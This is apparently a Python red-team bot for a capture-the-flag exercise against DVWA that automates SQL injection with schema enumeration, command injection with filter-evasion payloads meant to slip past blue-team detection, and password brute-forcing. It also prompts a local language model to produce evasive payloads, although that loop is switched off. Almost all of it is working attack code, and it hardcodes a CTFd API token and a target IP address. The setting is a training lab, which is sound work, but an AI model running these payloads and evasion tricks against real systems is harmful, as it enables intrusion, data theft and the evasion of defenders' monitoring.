from openai import OpenAI
import requests
import re
import time

# ============================================
# CONFIGURATION
# ============================================
LM_STUDIO_URL = "http://localhost:1234/v1"
TARGET = "http://159.203.87.83:8080"
CTFD_URL = "http://159.203.87.83:8000"
CTFD_TOKEN = "ctfd_c71ece44ffa15cb35b481321bc9e9d053c5bd5a94b02c2ab16a919a5b4133997"  # ← your token

CHALLENGES = {
    "sql_injection": 1,
    "command_injection": 2,
    "brute_force": 3
}

# ====================== ZAP PAYLOAD GENERATOR ======================
ZAP_PAYLOADS_FILE = "zap_payloads.txt"   # ← one payload per line from ZAP fuzzer

def load_zap_payloads():
    try:
        with open(ZAP_PAYLOADS_FILE, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(payloads)} payloads from ZAP")
        return payloads
    except FileNotFoundError:
        print(f"[!] {ZAP_PAYLOADS_FILE} not found — using LLM only")
        return []
    except Exception as e:
        print(f"[!] Error loading ZAP payloads: {e}")
        return []

# ============================================

# ====================== FAST DIRECT PAYLOADS ======================
# Try these before ZAP/LLM — covers the most likely flag locations
# in DVWA CTF setups. Blast through them fast before blue team polls.
FAST_SQL_PAYLOADS = [
    # Generic guesses — common CTF flag table/column names
    # Bot should find the flag through enumeration, not hardcoded answers
    "1' UNION SELECT 1,flag FROM flag-- -",
    "1' UNION SELECT 1,flag FROM flags-- -",
    "1' UNION SELECT user,password FROM users-- -",
    "1' UNION SELECT first_name,last_name FROM users-- -",
    "1' UNION SELECT 1,secret FROM secret-- -",
    "1' UNION SELECT comment,name FROM guestbook-- -",
]

FAST_CMD_PAYLOADS = [
    # Classic injection operators — try them all fast
    "127.0.0.1; cat /var/www/html/hackable/flags/flag2.txt",
    "127.0.0.1 | cat /var/www/html/hackable/flags/flag2.txt",
    "127.0.0.1 && cat /var/www/html/hackable/flags/flag2.txt",
    # Alternative read commands (blue team may not pattern-match these)
    "127.0.0.1; head -1 /var/www/html/hackable/flags/flag2.txt",
    "127.0.0.1; tac /var/www/html/hackable/flags/flag2.txt",
    "127.0.0.1; strings /var/www/html/hackable/flags/flag2.txt",
    # Newline injection
    "127.0.0.1\ncat /var/www/html/hackable/flags/flag2.txt",
    # IFS evasion
    "127.0.0.1;${IFS}cat${IFS}/var/www/html/hackable/flags/flag2.txt",
    # Subshell
    "127.0.0.1 $(cat /var/www/html/hackable/flags/flag2.txt)",
    # Variable assignment trick
    "127.0.0.1; F=/var/www/html/hackable/flags/flag2.txt; cat $F",
    # Glob wildcard (avoids exact filename string)
    "127.0.0.1; cat /var/www/html/hackable/flags/flag?.txt",
    # Brace expansion
    "127.0.0.1; {cat,/var/www/html/hackable/flags/flag2.txt}",
]

client = OpenAI(base_url=LM_STUDIO_URL, api_key="lm-studio")
session = requests.Session()
captured_flags = set()

def ask_llm(prompt, system=None):
    if system is None:
        system = (
            "You are a CTF red team bot attacking DVWA. "
            "Output ONE raw attack payload only. No explanation, no markdown, no code blocks. "
            "For SQL: avoid 'union select' as a phrase — use CHAR() encoding or hex literals instead. "
            "For CMD: use ${IFS} for spaces, or alternative tools like head/tac/awk instead of cat."
        )
    response = client.chat.completions.create(
        model="meta-llama-3.1-8b-instruct",
        messages=[
            {"role": "system", "content": system},
            {"role": "user", "content": prompt}
        ]
    )
    return response.choices[0].message.content.strip()

# ====================== CORE HELPERS ======================
def login_to_dvwa():
    print("[*] Logging into DVWA...")
    r = session.get(f"{TARGET}/login.php")
    token = re.search(r"user_token.*?value='(.*?)'", r.text)
    token = token.group(1) if token else ""
    session.post(f"{TARGET}/login.php", data={
        "username": "admin", "password": "password", "Login": "Login", "user_token": token
    })
    print("[+] Logged in successfully")

def set_dvwa_security_low():
    r = session.get(f"{TARGET}/security.php")
    token = re.search(r"user_token.*?value='(.*?)'", r.text)
    token = token.group(1) if token else ""
    session.post(f"{TARGET}/security.php", data={
        "security": "low", "seclev_submit": "Submit", "user_token": token
    })
    print("[*] Security set to low")

def is_blocked():
    try:
        r = session.get(f"{TARGET}/index.php", timeout=5)
        return "login" in r.url.lower()
    except:
        return True

def get_ctfd_nonce():
    r = requests.get(f"{CTFD_URL}/challenges", headers={"Authorization": f"Token {CTFD_TOKEN}"})
    nonce = re.search(r"'csrfNonce': \"(.*?)\"", r.text)
    return nonce.group(1) if nonce else ""

def submit_flag(flag, challenge_id):
    if flag in captured_flags:
        return
    print(f"[*] Submitting flag: {flag}")
    nonce = get_ctfd_nonce()
    result = requests.post(
        f"{CTFD_URL}/api/v1/challenges/attempt",
        json={"challenge_id": challenge_id, "submission": flag},
        headers={"Authorization": f"Token {CTFD_TOKEN}", "Content-Type": "application/json", "CSRF-Token": nonce}
    )
    if result.status_code == 200 and result.json().get("data", {}).get("status") == "correct":
        print(f"[+] FLAG ACCEPTED!")
        captured_flags.add(flag)

def extract_flag(text):
    match = re.search(r"FLAG\{.*?\}", text)
    return match.group(0) if match else None

# ====================== ATTACK HELPERS ======================
def try_fast_payloads(fast_payloads, endpoint_func, label="fast"):
    """Phase 0: blast through known-good payloads with minimal delay.
    Goal is to capture flag before blue team's polling loop processes logs."""
    print(f"[*] Phase 0 ({label}): trying {len(fast_payloads)} direct payloads...")
    for payload in fast_payloads:
        print(f"[*] {label}: {payload[:80]}")
        try:
            result = endpoint_func(payload)
            flag = extract_flag(result)
            if flag:
                print(f"[!!!] FLAG FOUND (phase 0): {flag}")
                return flag
        except:
            pass
        time.sleep(0.2)
        if is_blocked():
            print("[!] Blocked during fast phase — moving on")
            return False
    return False


def try_payloads_with_zap_first(base_task, endpoint_func):
    """Phase 1: ZAP payloads. Phase 2: LLM evasion fallback."""
    zap_payloads = load_zap_payloads()
    attempt_history = []

    print(f"[*] Phase 1 (ZAP): trying {len(zap_payloads)} payloads...")
    for payload in zap_payloads:
        if is_blocked():
            return False
        print(f"[*] ZAP: {payload[:80]}")
        try:
            result = endpoint_func(payload)
            flag = extract_flag(result)
            if flag:
                print(f"[!!!] FLAG FOUND (ZAP): {flag}")
                return flag
            attempt_history.append(payload)
        except:
            pass
        time.sleep(0.3)

    print("[*] Phase 2 (LLM evasion)...")
    for i in range(0):  # LLM disabled — too unreliable, fast phase covers everything
        if is_blocked():
            return False
        try:
            payload = ask_llm(
                f"Task: {base_task}\n"
                f"Failed payloads: {'; '.join(attempt_history[-3:]) if attempt_history else 'none'}\n"
                "Give ONE new evasive payload. Raw only."
            )
        except Exception as e:
            print(f"[!] LLM error: {e}")
            time.sleep(1)
            continue
        # Sanity check — skip obviously garbage responses
        if len(payload) > 500 or "\n\n" in payload[:100]:
            print(f"[!] LLM returned garbage, skipping")
            continue
        print(f"[*] LLM [{i+1}]: {payload[:80]}")
        try:
            result = endpoint_func(payload)
            flag = extract_flag(result)
            if flag:
                print(f"[!!!] FLAG FOUND (LLM): {flag}")
                return flag
            attempt_history.append(payload)
        except:
            pass
        time.sleep(0.4)
    return False

# ============================================
# SQL ENUMERATION — discovers flag automatically
# ============================================
def enumerate_and_dump_flag(try_sqli):
    """Enumerate tables → columns → find FLAG{} without hardcoding anything."""
    print("[*] Starting SQL enumeration...")

    # Step 1: get all table names in current database
    r = try_sqli("1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -")
    tables = re.findall(r"First name: ([^\s<]+)", r) if r else []
    print(f"[*] Tables found: {tables}")

    if not tables:
        return None

    # Step 2: for each table, get column names and dump data looking for FLAG{}
    for table in tables:
        if is_blocked():
            return None

        col_r = try_sqli(f"1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='{table}'-- -")
        columns = re.findall(r"First name: ([^\s<]+)", col_r) if col_r else []
        print(f"[*] {table}: columns = {columns}")

        # Dump every column pair looking for FLAG{}
        for col in columns:
            if is_blocked():
                return None
            dump_r = try_sqli(f"1' UNION SELECT {col},2 FROM {table}-- -")
            flag = extract_flag(dump_r) if dump_r else None
            if flag:
                print(f"[+] Flag found in {table}.{col}")
                return flag
            # Also try it in second position
            dump_r2 = try_sqli(f"1' UNION SELECT 1,{col} FROM {table}-- -")
            flag = extract_flag(dump_r2) if dump_r2 else None
            if flag:
                print(f"[+] Flag found in {table}.{col} (pos 2)")
                return flag

    return None


# ============================================
# CHALLENGE 1 — SQL INJECTION
# ============================================
def attack_sql_injection():
    print("\n" + "="*50)
    print("[*] CHALLENGE 1: SQL INJECTION (ZAP + LLM)")
    print("="*50)

    def try_sqli(payload):
        try:
            r = session.get(f"{TARGET}/vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"}, timeout=5)
            return r.text
        except:
            return ""

    # Phase 0: blast fast direct payloads
    flag = try_fast_payloads(FAST_SQL_PAYLOADS, try_sqli, label="sql-fast")
    if flag:
        submit_flag(flag, CHALLENGES["sql_injection"])
        return True

    if is_blocked():
        print("[-] Blocked after fast phase")
        return False

    # Phase 1: full enumeration — discovers table/column automatically
    print("[*] Fast guesses failed — running full enumeration...")
    flag = enumerate_and_dump_flag(try_sqli)
    if flag:
        submit_flag(flag, CHALLENGES["sql_injection"])
        return True

    if is_blocked():
        return False

    # Phase 2: ZAP then LLM fallback
    flag = try_payloads_with_zap_first(
        base_task="SQL injection on DVWA id parameter. Enumerate tables and dump FLAG{...} value.",
        endpoint_func=try_sqli
    )
    if flag:
        submit_flag(flag, CHALLENGES["sql_injection"])
        return True

    print("[-] SQL injection failed")
    return False

# ============================================
# CHALLENGE 2 — COMMAND INJECTION
# ============================================
def attack_command_injection():
    print("\n" + "="*50)
    print("[*] CHALLENGE 2: COMMAND INJECTION (ZAP + LLM)")
    print("="*50)

    def try_cmd(payload):
        try:
            r = session.post(f"{TARGET}/vulnerabilities/exec/", data={"ip": payload, "Submit": "Submit"}, timeout=5)
            return r.text
        except:
            return ""

    # Phase 0: fast direct payloads
    flag = try_fast_payloads(FAST_CMD_PAYLOADS, try_cmd, label="cmd-fast")
    if flag:
        submit_flag(flag, CHALLENGES["command_injection"])
        return True

    if is_blocked():
        print("[-] Blocked after fast phase")
        return False

    # Phase 1+2: ZAP then LLM
    flag = try_payloads_with_zap_first(
        base_task="Command injection on DVWA ip parameter. Read /var/www/html/hackable/flags/flag2.txt. Use alternative read commands (head, tac, awk, python3) and shell evasion (IFS, brace expansion, base64) to bypass pattern detection.",
        endpoint_func=try_cmd
    )
    if flag:
        submit_flag(flag, CHALLENGES["command_injection"])
        return True

    print("[-] Command injection failed")
    return False

# ============================================
# CHALLENGE 3 — BRUTE FORCE (unchanged)
# ============================================
def attack_brute_force():
    print("\n" + "="*50)
    print("[*] CHALLENGE 3: BRUTE FORCE")
    print("="*50)

    usernames = ["admin", "user", "test", "guest", "administrator"]
    # Top ~100 rockyou passwords — sorted by real-world frequency
    passwords = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey",
        "1234567", "letmein", "trustno1", "dragon", "baseball", "iloveyou",
        "master", "sunshine", "princess", "welcome", "shadow", "superman",
        "michael", "football", "password1", "1234567890", "123456789",
        "12345", "nicole", "daniel", "babygirl", "lovely", "jessica",
        "654321", "111111", "admin", "123123", "qazwsx", "hunter",
        "buster", "soccer", "harley", "batman", "andrew", "tigger",
        "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas",
        "hockey", "ranger", "daniel", "george", "jordan", "cheese",
        "michelle", "pepper", "access", "hannah", "maggie", "junior",
        "zxcvbn", "scooter", "1q2w3e4r", "qwertyuiop", "superman",
        "2112", "1987", "1986", "1985", "1984", "1983", "1982", "1981",
        "mustang", "hellokitty", "pass", "test", "1234", "dvwa",
        "root", "toor", "alpine", "raspberry", "admin123", "admin1",
        "password123", "passw0rd", "P@ssw0rd", "changeme", "secret",
        "login", "pass123", "1q2w3e", "zxcvbnm", "asdfgh", "asdfghjkl",
        "starwars", "matrix", "whatever", "hello", "flower", "thunder",
        "111111", "666666", "121212", "112233", "7777777", "555555",
    ]

    for username in usernames:
        for password in passwords:
            if is_blocked(): return False
            try:
                r = session.get(f"{TARGET}/vulnerabilities/brute/", params={"username": username, "password": password, "Login": "Login"}, timeout=5)
                if "Welcome to the password protected area" in r.text:
                    print(f"[+] CREDENTIALS FOUND: {username}:{password}")
                    flag_r = session.get(f"{TARGET}/hackable/flags/flag3.txt", timeout=5)
                    flag = extract_flag(flag_r.text)
                    if flag:
                        print(f"[!!!] FLAG FOUND: {flag}")
                        submit_flag(flag, CHALLENGES["brute_force"])
                        return True
            except:
                pass

    print("[*] Common creds exhausted — asking LLM...")
    try:
        more_pw = ask_llm("List 15 common passwords, one per line, nothing else.")
    except Exception as e:
        print(f"[!] LLM error: {e}")
        return False
    for pw in more_pw.strip().splitlines()[:15]:
        pw = pw.strip()
        if not pw: continue
        if is_blocked(): return False
        try:
            r = session.get(f"{TARGET}/vulnerabilities/brute/", params={"username": "admin", "password": pw, "Login": "Login"}, timeout=5)
            if "Welcome to the password protected area" in r.text:
                flag_r = session.get(f"{TARGET}/hackable/flags/flag3.txt", timeout=5)
                flag = extract_flag(flag_r.text)
                if flag:
                    print(f"[!!!] FLAG FOUND: {flag}")
                    submit_flag(flag, CHALLENGES["brute_force"])
                    return True
        except:
            pass

    print("[-] Brute force failed")
    return False

# ============================================
# MAIN
# ============================================
def attack_all():
    login_to_dvwa()
    set_dvwa_security_low()

    results = {"sql_injection": False, "command_injection": False, "brute_force": False}

    results["sql_injection"] = attack_sql_injection()

    if not is_blocked():
        results["command_injection"] = attack_command_injection()

    if not is_blocked():
        results["brute_force"] = attack_brute_force()

    print("\n" + "="*50)
    print("RED TEAM FINAL SCORE")
    print("="*50)
    captured = sum(1 for v in results.values() if v)
    for chal, success in results.items():
        print(f"  {chal}: {'CAPTURED' if success else 'FAILED'}")
    print(f"\nFlags captured: {captured}/3")
    print(f"Scoreboard: {CTFD_URL}/scoreboard")
    print("="*50)

if __name__ == "__main__":
    print("=== RED TEAM BOT STARTING (ZAP + LLM evasion) ===")
    print(f"[*] ZAP payload file: {ZAP_PAYLOADS_FILE}")
    attack_all()
